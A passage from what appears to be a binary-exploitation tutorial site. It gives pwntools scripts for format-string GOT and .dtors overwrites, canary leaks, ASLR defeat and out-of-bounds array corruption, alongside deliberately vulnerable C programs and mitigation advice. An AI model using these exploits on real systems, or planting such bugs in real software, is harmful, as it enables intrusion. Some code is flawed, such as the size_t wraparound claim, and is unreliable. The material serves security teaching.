\"\"\"More precise GOT overwrite using multiple writes\"\"\"\n\n    elf = ELF('./vuln_printf')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust path\n\n    # Target function in GOT\n    target_got = elf.got['puts']\n    system_offset = libc.symbols['system']\n\n    # Use multiple %hn writes for precision\n    p = process('./vuln_printf')\n\n    # Find libc base (requires leak)\n    # This is simplified - real attack would need libc leak first\n\n    system_addr = 0x7ffff7a52390  # Example system address\n\n    # Split address into 16-bit chunks\n    low_word = system_addr &amp; 0xffff\n    mid_word = (system_addr &gt;&gt; 16) &amp; 0xffff\n    high_word = (system_addr &gt;&gt; 32) &amp; 0xffff\n\n    payload = p64(target_got)      # +0: low word\n    payload += p64(target_got + 2) # +2: mid word  \n    payload += p64(target_got + 4) # +4: high word\n\n    # Write low word\n    payload += f'%{low_word - 24}d%8$hn'.encode()  # Adjust for 3 addresses\n\n    # Write mid word\n    chars_so_far = low_word\n    chars_needed = mid_word - chars_so_far\n    if chars_needed &lt; 0:\n        chars_needed += 0x10000\n\n    payload += f'%{chars_needed}d%9$hn'.encode()\n\n    # Write high word\n    chars_so_far = mid_word\n    chars_needed = high_word - chars_so_far\n    if chars_needed &lt; 0:\n        chars_needed += 0x10000\n\n    payload += f'%{chars_needed}d%10$hn'.encode()\n\n    p.sendline(payload)\n\n    # Trigger the overwritten function\n    p.sendline(b'/bin/sh')\n    p.interactive()\n\ngot_overwrite()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"binary-exploitation/memory/01-format-string/#dtors-overwrite","title":"DTORS Overwrite","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef dtors_overwrite():\n    \"\"\"Overwrite destructors table\"\"\"\n\n    # Find .dtors section\n    elf = ELF('./vuln_printf')\n\n    # .dtors is typically at a known location\n    # This technique is mostly for older binaries\n    dtors_addr = 0x8049934  # Example address\n\n    win_function = 0x8048484  # Address of win function\n\n    p = process('./vuln_printf')\n\n    # Overwrite .dtors with win function address\n    payload = p32(dtors_addr)\n    payload += f'%{win_function - 4}d%8$n'.encode()\n\n    p.sendline(payload)\n\n    # When program exits, destructors are called\n    p.close()  # This should trigger the win function\n\ndtors_overwrite()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#stack-canary-bypass","title":"Stack Canary Bypass","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef leak_stack_canary():\n    \"\"\"Leak stack canary using format string\"\"\"\n\n    p = process('./vuln_printf_canary')  # Binary compiled with canaries\n\n    # Stack canaries are typically at predictable offsets\n    # Canary usually ends with null byte\n\n    payload = b'%p.' * 50  # Dump many stack values\n    p.sendline(payload)\n\n    output = p.recvall()\n    values = output.split(b'.')\n\n    for i, value in enumerate(values):\n        try:\n            if value.startswith(b'0x'):\n                addr = int(value, 16)\n                # Canary typically has pattern like 0x????????00\n                if (addr &amp; 0xff) == 0 and addr &gt; 0x1000000:\n                    print(f\"Potential canary at offset {i}: 0x{addr:016x}\")\n        except:\n            continue\n\ndef bypass_canary_with_leak():\n    \"\"\"Use leaked canary to bypass protection\"\"\"\n\n    # First leak the canary\n    p = process('./vuln_printf_canary')\n\n    # Leak canary (adjust offset based on analysis)\n    payload = b'%23$p'  # Example offset\n    p.sendline(payload)\n\n    canary_leak = p.recvline()\n    canary = int(canary_leak.strip(), 16)\n    print(f\"Leaked canary: 0x{canary:016x}\")\n\n    p.close()\n\n    # Now use in buffer overflow\n    p = process('./vuln_printf_canary')\n\n    # Trigger buffer overflow but preserve canary\n    payload = b'A' * 64      # Fill buffer\n    payload += p64(canary)   # Restore canary\n    payload += b'B' * 8      # Saved RBP\n    payload += p64(0x401234) # Return address\n\n    p.sendline(payload)\n    p.interactive()\n\nleak_stack_canary()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#format-string-with-aslr","title":"Format String with ASLR","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef defeat_aslr_with_leaks():\n    \"\"\"Use format string leaks to defeat ASLR\"\"\"\n\n    p = process('./vuln_printf')\n\n    # Leak multiple addresses to determine base addresses\n    payload = b'%p.' * 30\n    p.sendline(payload)\n\n    output = p.recvall()\n    values = output.split(b'.')\n\n    stack_leak = None\n    libc_leak = None\n    binary_leak = None\n\n    for i, value in enumerate(values):\n        try:\n            if value.startswith(b'0x'):\n                addr = int(value, 16)\n\n                # Identify address types by range\n                if 0x7fff00000000 &lt;= addr &lt;= 0x7fffffffffff:\n                    if not stack_leak:\n                        stack_leak = addr\n                        print(f\"Stack leak: 0x{addr:016x}\")\n\n                elif 0x7f0000000000 &lt;= addr &lt;= 0x7fffffffffff:\n                    if not libc_leak:\n                        libc_leak = addr\n                        print(f\"Libc leak: 0x{addr:016x}\")\n\n                elif 0x400000 &lt;= addr &lt;= 0x500000:\n                    if not binary_leak:\n                        binary_leak = addr\n                        print(f\"Binary leak: 0x{addr:016x}\")\n        except:\n            continue\n\n    # Calculate base addresses\n    if libc_leak:\n        # Calculate libc base (requires knowing offset of leaked function)\n        libc_base = libc_leak - 0x29d90  # Example offset to puts\n        print(f\"Calculated libc base: 0x{libc_base:016x}\")\n\n        # Now we can calculate gadget addresses\n        system_addr = libc_base + 0x52290  # Example offset to system\n        print(f\"System address: 0x{system_addr:016x}\")\n\ndefeat_aslr_with_leaks()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#exploitation-framework","title":"Exploitation Framework","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\nclass FormatStringExploit:\n    def __init__(self, binary_path):\n        self.binary = binary_path\n        self.elf = ELF(binary_path)\n        self.offset = None\n\n    def find_offset(self):\n        \"\"\"Find format string offset automatically\"\"\"\n\n        pattern = b'AAAABBBB'\n\n        for offset in range(1, 100):\n            try:\n                p = process(self.binary)\n                payload = pattern + f'%{offset}$p'.encode()\n                p.sendline(payload)\n\n                output = p.recvall(timeout=1)\n\n                if b'41414141' in output or b'42424242' in output:\n                    self.offset = offset\n                    print(f\"Found format string offset: {offset}\")\n                    p.close()\n                    return offset\n\n                p.close()\n            except:\n                continue\n\n        print(\"Could not find format string offset\")\n        return None\n\n    def leak_address(self, stack_offset):\n        \"\"\"Leak address at specific stack offset\"\"\"\n\n        p = process(self.binary)\n        payload = f'%{stack_offset}$p'.encode()\n        p.sendline(payload)\n\n        output = p.recvall(timeout=1)\n\n        try:\n            addr = int(output.strip(), 16)\n            p.close()\n            return addr\n        except:\n            p.close()\n            return None\n\n    def arbitrary_read(self, address):\n        \"\"\"Read from arbitrary address\"\"\"\n\n        if not self.offset:\n            self.find_offset()\n\n        p = process(self.binary)\n\n        payload = p64(address)\n        payload += f'%{self.offset}$s'.encode()\n\n        p.sendline(payload)\n\n        try:\n            output = p.recvall(timeout=2)\n            p.close()\n            # Extract the actual read data\n            return output[8:]  # Skip the address we put on stack\n        except:\n            p.close()\n            return None\n\n    def arbitrary_write(self, address, value):\n        \"\"\"Write value to arbitrary address\"\"\"\n\n        if not self.offset:\n            self.find_offset()\n\n        p = process(self.binary)\n\n        payload = p64(address)\n\n        chars_needed = value - 8\n        if chars_needed &gt; 0:\n            payload += b'A' * chars_needed\n\n        payload += f'%{self.offset}$n'.encode()\n\n        p.sendline(payload)\n        output = p.recvall(timeout=1)\n        p.close()\n\n        return output\n\n    def got_overwrite_system(self, target_function):\n        \"\"\"Overwrite GOT entry with system\"\"\"\n\n        if target_function not in self.elf.got:\n            print(f\"Function {target_function} not in GOT\")\n            return False\n\n        got_addr = self.elf.got[target_function]\n\n        # This is simplified - real implementation needs system address\n        system_addr = 0x7ffff7a52390  # Would need to be leaked/calculated\n\n        return self.arbitrary_write(got_addr, system_addr)\n\n# Usage example\ndef exploit_example():\n    exploit = FormatStringExploit('./vuln_printf')\n\n    # Find offset\n    exploit.find_offset()\n\n    # Leak some addresses\n    leaked_addr = exploit.leak_address(6)\n    print(f\"Leaked address: 0x{leaked_addr:016x}\")\n\n    # Read from leaked address\n    data = exploit.arbitrary_read(leaked_addr)\n    print(f\"Data at leaked address: {data}\")\n\n    # Overwrite GOT (if we had proper addresses)\n    # exploit.got_overwrite_system('puts')\n\nexploit_example()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#protection-and-mitigation","title":"Protection and Mitigation","text":""},{"location":"binary-exploitation/memory/01-format-string/#secure-coding-practices","title":"Secure Coding Practices","text":"<pre><code>// secure_printf.c - How to avoid format string vulnerabilities\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid secure_function(char *user_input) {\n    // GOOD: Use format string with user input as argument\n    printf(\"%s\", user_input);\n\n    // GOOD: Use puts for simple string output\n    puts(user_input);\n\n    // GOOD: Use fputs for file output\n    fputs(user_input, stdout);\n}\n\nvoid secure_logging(char *message) {\n    char log_entry[512];\n\n    // GOOD: Use snprintf with proper format\n    snprintf(log_entry, sizeof(log_entry), \"LOG: %s\", message);\n\n    printf(\"%s\\n\", log_entry);\n}\n\n// GOOD: Use format string constants\n#define LOG_FORMAT \"User: %s, Action: %s, Time: %ld\\n\"\n\nvoid structured_logging(char *user, char *action, long timestamp) {\n    printf(LOG_FORMAT, user, action, timestamp);\n}\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#compiler-protections","title":"Compiler Protections","text":"<pre><code># Compile with format string protection\ngcc -Wformat -Wformat-security -Werror=format-security -o secure vuln.c\n\n# Modern compilers warn about format string issues\ngcc -Wall -Wextra -o vuln vuln.c\n# Warning: format string is not a string literal\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#runtime-protections","title":"Runtime Protections","text":"<pre><code>// FORTIFY_SOURCE helps detect format string attacks\n// Compile with: gcc -D_FORTIFY_SOURCE=2 -O2\n\n#include &lt;stdio.h&gt;\n\nvoid protected_function(char *input) {\n    // Runtime checking will detect direct format string usage\n    printf(input);  // This may abort at runtime with FORTIFY_SOURCE\n}\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#key-takeaways","title":"Key Takeaways","text":"<p>Format String Fundamentals</p> <ul> <li>User input as format string is the root cause of vulnerabilities</li> <li>Stack access allows reading arbitrary memory locations</li> <li>%n specifier enables arbitrary memory writes</li> <li>GOT overwrites can redirect program execution</li> <li>Information leaks can defeat ASLR and other protections</li> </ul> <p>Common Mistakes</p> <ul> <li>Passing user input directly to printf family functions</li> <li>Not validating format strings in logging functions</li> <li>Assuming format string attacks only read memory</li> <li>Ignoring compiler warnings about format security</li> <li>Using sprintf/fprintf without proper format validation</li> </ul> <p>Exploitation Tips</p> <ul> <li>Find the format string offset first</li> <li>Use %p to leak addresses and defeat ASLR</li> <li>GOT overwrites are often the most reliable attack</li> <li>Combine with other vulnerabilities for full exploitation</li> <li>Practice with different format specifiers and their effects</li> </ul> <p>Next: Array Indexing Vulnerabilities</p>"},{"location":"binary-exploitation/memory/02-array-indexing/","title":"Array Indexing Vulnerabilities","text":"<p>Array indexing vulnerabilities, also known as out-of-bounds access vulnerabilities, occur when programs access array elements beyond their allocated boundaries. These can lead to information disclosure, memory corruption, and arbitrary code execution.</p>"},{"location":"binary-exploitation/memory/02-array-indexing/#understanding-array-bounds","title":"Understanding Array Bounds","text":""},{"location":"binary-exploitation/memory/02-array-indexing/#array-memory-layout","title":"Array Memory Layout","text":"<pre><code>Array Memory Layout:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  array[-2]          \u2502 \u2190 Out of bounds (negative)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  array[-1]          \u2502 \u2190 Out of bounds (negative)  \n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  array[0]           \u2502 \u2190 Valid range starts\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  array[1]           \u2502 \u2190 Valid elements\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  ...                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  array[size-1]      \u2502 \u2190 Valid range ends\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  array[size]        \u2502 \u2190 Out of bounds (positive)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  array[size+1]      \u2502 \u2190 Out of bounds (positive)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#types-of-array-indexing-vulnerabilities","title":"Types of Array Indexing Vulnerabilities","text":"<ol> <li>Positive overflow - Index &gt;= array_size</li> <li>Negative underflow - Index &lt; 0</li> <li>Off-by-one errors - Index == array_size</li> <li>Integer wraparound - Large unsigned values becoming negative</li> </ol>"},{"location":"binary-exploitation/memory/02-array-indexing/#vulnerable-code-examples","title":"Vulnerable Code Examples","text":""},{"location":"binary-exploitation/memory/02-array-indexing/#basic-out-of-bounds-access","title":"Basic Out-of-Bounds Access","text":"<pre><code>// vuln_array.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint data[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\nint secret = 0xdeadbeef;\n\nvoid print_array_element(int index) {\n    printf(\"data[%d] = %d\\n\", index, data[index]);  // VULNERABLE\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s &lt;index&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    int index = atoi(argv[1]);\n    print_array_element(index);\n\n    return 0;\n}\n</code></pre> <p>Test: <pre><code>gcc -o vuln_array vuln_array.c\n./vuln_array 0     # Valid: prints data[0]\n./vuln_array 10    # Invalid: out of bounds\n./vuln_array -1    # Invalid: negative index\n./vuln_array 11    # May access 'secret' variable\n</code></pre></p>"},{"location":"binary-exploitation/memory/02-array-indexing/#buffer-write-with-index-control","title":"Buffer Write with Index Control","text":"<pre><code>// vuln_write.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nchar buffer[100];\nchar admin_flag = 0;\n\nvoid write_to_buffer(int index, char value) {\n    if (index &gt;= 100) {\n        printf(\"Index too large!\\n\");\n        return;\n    }\n\n    // VULNERABLE: Missing check for negative indices\n    buffer[index] = value;\n    printf(\"buffer[%d] = %c\\n\", index, value);\n}\n\nvoid check_admin() {\n    if (admin_flag) {\n        printf(\"Admin access granted!\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        printf(\"Usage: %s &lt;index&gt; &lt;value&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    int index = atoi(argv[1]);\n    char value = argv[2][0];\n\n    write_to_buffer(index, value);\n    check_admin();\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#dynamic-array-vulnerability","title":"Dynamic Array Vulnerability","text":"<pre><code>// vuln_dynamic.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct {\n    int *data;\n    size_t size;\n    size_t capacity;\n} dynamic_array;\n\ndynamic_array* create_array(size_t initial_capacity) {\n    dynamic_array *arr = malloc(sizeof(dynamic_array));\n    arr-&gt;data = malloc(initial_capacity * sizeof(int));\n    arr-&gt;size = 0;\n    arr-&gt;capacity = initial_capacity;\n    return arr;\n}\n\nint get_element(dynamic_array *arr, size_t index) {\n    // VULNERABLE: No bounds checking\n    return arr-&gt;data[index];\n}\n\nvoid set_element(dynamic_array *arr, size_t index, int value) {\n    // VULNERABLE: No bounds checking\n    arr-&gt;data[index] = value;\n}\n\nint main() {\n    dynamic_array *arr = create_array(10);\n\n    // Add some elements\n    for (int i = 0; i &lt; 5; i++) {\n        set_element(arr, i, i * 10);\n    }\n\n    // User-controlled access\n    printf(\"Enter index: \");\n    size_t index;\n    scanf(\"%zu\", &amp;index);\n\n    printf(\"Element at %zu: %d\\n\", index, get_element(arr, index));\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"binary-exploitation/memory/02-array-indexing/#information-disclosure","title":"Information Disclosure","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef probe_memory_layout():\n    \"\"\"Probe memory layout using out-of-bounds reads\"\"\"\n\n    print(\"Probing memory layout:\")\n\n    for index in range(-10, 20):\n        try:\n            p = process(['./vuln_array', str(index)])\n            output = p.recvall(timeout=1)\n\n            if b'data[' in output:\n                value = output.split(b'= ')[1].strip()\n                print(f\"Index {index:3d}: {value.decode()}\")\n\n            p.close()\n        except:\n            continue\n\ndef leak_adjacent_variables():\n    \"\"\"Leak variables adjacent to array\"\"\"\n\n    # Try different indices to find interesting values\n    interesting_indices = []\n\n    for index in range(10, 50):  # Beyond array bounds\n        try:\n            p = process(['./vuln_array', str(index)])\n            output = p.recvall(timeout=1)\n\n            if b'data[' in output:\n                value_str = output.split(b'= ')[1].strip().decode()\n                value = int(value_str)\n\n                # Look for interesting patterns (pointers, magic values, etc.)\n                if value &gt; 0x1000 or value &lt; -1000 or hex(value).count('dead') &gt; 0:\n                    interesting_indices.append((index, value))\n                    print(f\"Interesting value at index {index}: {hex(value)}\")\n\n            p.close()\n        except:\n            continue\n\n    return interesting_indices\n\ndef negative_index_probing():\n    \"\"\"Probe negative indices to access stack/heap data\"\"\"\n\n    print(\"Probing negative indices:\")\n\n    for index in range(-50, 0):\n        try:\n            p = process(['./vuln_array', str(index)])\n            output = p.recvall(timeout=1)\n\n            if b'data[' in output and b'Segmentation' not in output:\n                value_str = output.split(b'= ')[1].strip().decode()\n                print(f\"Index {index}: {value_str}\")\n\n            p.close()\n        except:\n            continue\n\nprobe_memory_layout()\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#memory-corruption-via-write","title":"Memory Corruption via Write","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef corrupt_adjacent_variable():\n    \"\"\"Corrupt variables adjacent to array\"\"\"\n\n    # Try to find the offset to admin_flag\n    # admin_flag is likely right after buffer[100]\n\n    # Test different negative offsets\n    for offset in range(-200, -50):\n        try:\n            p = process(['./vuln_write', str(offset), 'X'])\n            p.sendline()  # Trigger check_admin\n\n            output = p.recvall(timeout=1)\n\n            if b'Admin access granted' in output:\n                print(f\"Found admin_flag at offset {offset}!\")\n                print(output.decode())\n                return offset\n            elif b'Access denied' not in output:\n                print(f\"Interesting response at offset {offset}: {output}\")\n\n            p.close()\n        except:\n            continue\n\n    return None\n\ndef precise_variable_overwrite():\n    \"\"\"Precisely overwrite the admin_flag variable\"\"\"\n\n    # Assuming we found admin_flag is at offset -X from buffer\n    # In the example, it might be at buffer[-1] or similar\n\n    admin_flag_offset = -1  # Adjust based on binary analysis\n\n    p = process(['./vuln_write', str(admin_flag_offset), '\\x01'])\n    p.sendline()\n\n    output = p.recvall()\n    print(\"Admin flag overwrite result:\")\n    print(output.decode())\n\n    if b'Admin access granted' in output:\n        print(\"Successfully corrupted admin_flag!\")\n        return True\n\n    return False\n\ndef stack_variable_corruption():\n    \"\"\"Corrupt stack variables using negative indexing\"\"\"\n\n    # Compile a test program that shows stack layout\n    test_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid vulnerable_function() {\n    int important_var = 0x12345678;\n    char buffer[10];\n    int another_var = 0x87654321;\n\n    printf(\"important_var address: %p\\\\n\", &amp;important_var);\n    printf(\"buffer address: %p\\\\n\", buffer);\n    printf(\"another_var address: %p\\\\n\", &amp;another_var);\n\n    // User can control index\n    int index = atoi(getenv(\"INDEX\"));\n    char value = getenv(\"VALUE\")[0];\n\n    buffer[index] = value;\n\n    printf(\"important_var: 0x%x\\\\n\", important_var);\n    printf(\"another_var: 0x%x\\\\n\", another_var);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n'''\n\n    # This would require compiling and testing\n    print(\"Stack variable corruption example - compile test program to analyze\")\n\ncorrupt_adjacent_variable()\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#heap-exploitation-via-array-indexing","title":"Heap Exploitation via Array Indexing","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef heap_overflow_via_indexing():\n    \"\"\"Exploit heap layout using out-of-bounds array access\"\"\"\n\n    # Create a program that allocates multiple objects\n    exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct {\n    char data[32];\n    void (*function_ptr)();\n} heap_object;\n\nvoid win() {\n    printf(\"Win function called!\\\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid normal_function() {\n    printf(\"Normal function called\\\\n\");\n}\n\nint main() {\n    // Allocate objects on heap\n    heap_object *obj1 = malloc(sizeof(heap_object));\n    heap_object *obj2 = malloc(sizeof(heap_object));\n\n    strcpy(obj1-&gt;data, \"First object\");\n    obj1-&gt;function_ptr = normal_function;\n\n    strcpy(obj2-&gt;data, \"Second object\");\n    obj2-&gt;function_ptr = normal_function;\n\n    printf(\"obj1: %p\\\\n\", obj1);\n    printf(\"obj2: %p\\\\n\", obj2);\n    printf(\"win function: %p\\\\n\", win);\n\n    // Vulnerable array access\n    int index;\n    printf(\"Enter index: \");\n    scanf(\"%d\", &amp;index);\n\n    // VULNERABLE: Can write beyond obj1 into obj2\n    obj1-&gt;data[index] = 0x41;  // Write 'A'\n\n    // Call function pointer (might be corrupted)\n    obj2-&gt;function_ptr();\n\n    return 0;\n}\n'''\n\n    print(\"Heap exploitation concept - analyze object layout\")\n    print(\"If obj2 is adjacent to obj1, can corrupt function pointer\")\n\ndef use_after_free_indexing():\n    \"\"\"Combine array indexing with use-after-free\"\"\"\n\n    exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint *global_array;\n\nvoid allocate_array(size_t size) {\n    global_array = malloc(size * sizeof(int));\n    for (size_t i = 0; i &lt; size; i++) {\n        global_array[i] = i;\n    }\n}\n\nvoid free_array() {\n    free(global_array);\n    // global_array not set to NULL - dangling pointer\n}\n\nvoid access_array(int index) {\n    // VULNERABLE: Use after free + out of bounds\n    printf(\"Array[%d] = %d\\\\n\", index, global_array[index]);\n}\n\nvoid allocate_victim() {\n    // Allocate something in the freed space\n    char *victim = malloc(40);\n    strcpy(victim, \"VICTIM_DATA_HERE\");\n}\n\nint main() {\n    allocate_array(10);\n    free_array();\n\n    allocate_victim();  // Reuse freed memory\n\n    // Now accessing the \"array\" accesses victim data\n    access_array(0);  // May read victim data\n\n    return 0;\n}\n'''\n\n    print(\"Use-after-free + indexing vulnerability concept\")\n\nheap_overflow_via_indexing()\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#advanced-exploitation-patterns","title":"Advanced Exploitation Patterns","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef integer_wraparound_exploit():\n    \"\"\"Exploit integer wraparound in array indexing\"\"\"\n\n    # When size_t index wraps around\n    exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid vulnerable_function(size_t index) {\n    int array[100];\n\n    // Check looks safe but can be bypassed with wraparound\n    if (index &lt; 100) {\n        printf(\"Index in bounds\\\\n\");\n        array[index] = 0x41414141;\n        printf(\"Wrote to array[%zu]\\\\n\", index);\n    } else {\n        printf(\"Index out of bounds\\\\n\");\n    }\n}\n\nint main() {\n    // These can bypass the bounds check:\n    vulnerable_function(0xffffffffffffffff);  // -1 as size_t\n    vulnerable_function(0xfffffffffffffffe);  // -2 as size_t\n\n    return 0;\n}\n'''\n\n    print(\"Integer wraparound exploit concept\")\n    print(\"size_t(-1) appears as very large positive number\")\n    print(\"But when used as signed, becomes negative index\")\n\ndef multiple_arrays_confusion():\n    \"\"\"Exploit confusion between multiple arrays\"\"\"\n\n    exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint array1[50];\nint array2[50];\nint secret = 0xdeadbeef;\n\nvoid set_array_element(int array_num, int index, int value) {\n    if (array_num == 1) {\n        // VULNERABLE: No bounds check on index\n        array1[index] = value;\n    } else if (array_num == 2) {\n        // VULNERABLE: No bounds check on index  \n        array2[index] = value;\n    }\n}\n\nint main() {\n    // If arrays are adjacent in memory:\n    // array1[50] might be array2[0]\n    // array1[100] might be secret\n\n    set_array_element(1, 100, 0x41414141);  // Might overwrite secret\n\n    printf(\"Secret: 0x%x\\\\n\", secret);\n\n    return 0;\n}\n'''\n\n    print(\"Multiple array confusion concept\")\n    print(\"Adjacent arrays can be confused via out-of-bounds access\")\n\ndef vector_reallocation_exploit():\n    \"\"\"Exploit vector reallocation vulnerabilities\"\"\"\n\n    exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct {\n    int *data;\n    size_t size;\n    size_t capacity;\n} vector;\n\nvector* create_vector() {\n    vector *v = malloc(sizeof(vector));\n    v-&gt;capacity = 4;\n    v-&gt;size = 0;\n    v-&gt;data = malloc(v-&gt;capacity * sizeof(int));\n    return v;\n}\n\nvoid push_back(vector *v, int value) {\n    if (v-&gt;size &gt;= v-&gt;capacity) {\n        // Realloc - this can move the data\n        v-&gt;capacity *= 2;\n        v-&gt;data = realloc(v-&gt;data, v-&gt;capacity * sizeof(int));\n    }\n\n    v-&gt;data[v-&gt;size++] = value;\n}\n\nint* get_element_ptr(vector *v, size_t index) {\n    // VULNERABLE: Returns pointer that might become invalid\n    return &amp;v-&gt;data[index];\n}\n\nint main() {\n    vector *v = create_vector();\n\n    push_back(v, 1);\n    push_back(v, 2);\n\n    int *ptr = get_element_ptr(v, 0);  // Get pointer to element\n\n    // These push_backs might cause reallocation\n    push_back(v, 3);\n    push_back(v, 4);\n    push_back(v, 5);  // Forces reallocation!\n\n    // ptr is now dangling - points to freed memory\n    *ptr = 0x41414141;  // Use after free\n\n    return 0;\n}\n'''\n\n    print(\"Vector reallocation vulnerability concept\")\n    print(\"Stored pointers become dangling after reallocation\")\n\ninteger_wraparound_exploit()\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#detection-and-analysis","title":"Detection and Analysis","text":""},{"location":"binary-exploitation/memory/02-array-indexing/#static-analysis-for-array-bounds","title":"Static Analysis for Array Bounds","text":"<pre><code>#!/usr/bin/env python3\nimport re\n\ndef analyze_c_code_for_array_bugs(code):\n    \"\"\"Simple static analysis for array indexing bugs\"\"\"\n\n    issues = []\n    lines = code.split('\\n')\n\n    for i, line in enumerate(lines, 1):\n        # Look for array access patterns\n        array_access = re.findall(r'(\\w+)\\[([^\\]]+)\\]', line)\n\n        for array_name, index_expr in array_access:\n            # Check for obvious issues\n            if 'atoi' in index_expr and 'if' not in line:\n                issues.append(f\"Line {i}: Unchecked user input in array index: {array_name}[{index_expr}]\")\n\n            if 'scanf' in index_expr and 'if' not in line:\n                issues.append(f\"Line {i}: Unchecked scanf input in array index: {array_name}[{index_expr}]\")\n\n            # Look for missing bounds checks\n            if any(var in index_expr for var in ['index', 'idx', 'i']) and 'if' not in line:\n                # Check if there's a bounds check nearby\n                bounds_check_found = False\n                for j in range(max(0, i-5), min(len(lines), i+2)):\n                    if 'if' in lines[j] and ('&gt;' in lines[j] or '&lt;' in lines[j]):\n                        bounds_check_found = True\n                        break\n\n                if not bounds_check_found:\n                    issues.append(f\"Line {i}: Possible missing bounds check for {array_name}[{index_expr}]\")\n\n    return issues\n\n# Example usage\nvulnerable_code = '''\nint data[100];\nint process_data(int index) {\n    return data[index];  // No bounds check\n}\n\nvoid write_data(int index, int value) {\n    if (index &lt; 100) {  // Missing negative check\n        data[index] = value;\n    }\n}\n\nint user_access() {\n    int idx = atoi(user_input);  // User input\n    return data[idx];  // Unchecked\n}\n'''\n\nissues = analyze_c_code_for_array_bugs(vulnerable_code)\nfor issue in issues:\n    print(issue)\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#dynamic-analysis-with-fuzzing","title":"Dynamic Analysis with Fuzzing","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport random\n\ndef fuzz_array_indexing(binary_path, iterations=1000):\n    \"\"\"Fuzz array indexing with various inputs\"\"\"\n\n    crashes = []\n    interesting_outputs = []\n\n    for i in range(iterations):\n        # Generate test inputs\n        test_inputs = [\n            str(random.randint(-1000, 1000)),           # Random index\n            str(0xffffffff),                            # Large positive\n            str(-1),                                    # Simple negative\n            str(random.randint(-100, -1)),              # Random negative\n            \"2147483647\",                               # INT_MAX\n            \"2147483648\",                               # 